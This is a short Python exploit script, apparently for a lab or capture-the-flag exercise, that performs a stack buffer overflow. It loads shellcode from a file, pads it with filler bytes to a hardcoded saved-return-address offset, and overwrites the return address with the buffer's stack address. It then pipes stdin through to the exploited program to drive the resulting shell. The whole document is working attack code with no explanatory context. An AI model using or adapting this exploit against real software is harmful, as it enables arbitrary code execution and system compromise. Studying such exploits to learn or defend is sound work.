#!/usr/bin/env python3
import os, sys, struct

buffer_addr = 0x7fffffffeca0
rip_addr = 0x7fffffffed28

shellfile = open("shellcode.bin", "rb")
shellcode = shellfile.read()

shellcode += b"A" * ((rip_addr - buffer_addr) - len(shellcode))

shellcode += struct.pack("<Q", buffer_addr)

fp = os.fdopen(sys.stdout.fileno(), 'wb')
fp.write(shellcode)
fp.flush()

while True:
    try:
        data = sys.stdin.buffer.read1(1024)
        if not data:
            break
        fp.write(data)
        fp.flush()
    except KeyboardInterrupt:
        break